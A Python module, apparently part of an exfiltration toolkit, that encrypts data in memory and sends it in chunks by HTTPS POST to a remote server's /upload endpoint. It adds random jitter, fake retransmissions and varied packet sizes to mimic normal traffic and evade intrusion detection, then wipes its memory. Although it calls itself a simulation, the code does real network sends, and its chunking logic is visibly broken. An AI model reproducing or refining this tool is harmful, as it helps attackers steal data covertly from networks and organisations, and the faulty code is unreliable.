import requests
import random
import time
from protocols.base_protocol import BaseProtocol
from security.memory_exfil import SecureMemoryExfiltrator

class HTTPSProtocol(BaseProtocol):
    """
    Simulates HTTPS exfiltration while mimicking real network behavior.
    - Uses random packet sizes.
    - Simulates fake retransmissions.
    - Introduces network jitter.
    """

    def __init__(self, command, server_ip):
        super().__init__(name="HTTPS", detection_rate=0.1, command=command, server_ip=server_ip)
        self.memory_exfil = SecureMemoryExfiltrator()  # In-memory encrypted storage

    def send_https_request(self, chunk):
        """
        Sends a packet via HTTPS with random delays and simulated retransmissions.
        """
        try:
            url = f"https://{self.server_ip}/upload"

            # Simulate retransmission probability (20%)
            if random.random() < 0.2:
                print("🔄 Simulating TCP Retransmission")
                time.sleep(random.uniform(0.1, 0.5))

            print(f"📡 Sending HTTPS Packet: {chunk}")

            # Introduce network jitter (200ms - 1.2s)
            time.sleep(random.uniform(0.2, 1.2))

            response = requests.post(url, data={"payload": chunk}, timeout=5)

            if response.status_code == 200:
                return True
            else:
                print(f"❌ HTTPS Packet Failed: {response.status_code}")
                return False

        except Exception as e:
            print(f"❌ HTTPS Transmission Error: {e}")
            return False

    def transmit(self, data):
        """
        Encrypts and transmits data via HTTPS while mimicking normal network traffic.
        """
        self.memory_exfil.store_data(data)  # Encrypt and store in-memory
        encoded_data = self.memory_exfil.read_data()

        # Send data in random-sized chunks (mimic real network packets)
        chunk_sizes = [random.randint(20, 100) for _ in range(len(encoded_data) // 50)]
        chunks = [encoded_data[i:i+size] for i, size in enumerate(chunk_sizes)]

        for chunk in chunks:
            success = self.send_https_request(chunk)

            detected = random.random() < self.detection_rate  # Simulate IDS detection

            if detected:
                print(f"⚠️ HTTPS Exfiltration Blocked! Adjusting parameters...")
                return False

        self.memory_exfil.secure_wipe_memory()  # Wipe memory after transmission
        print("✅ HTTPS Exfiltration Completed")
        return True
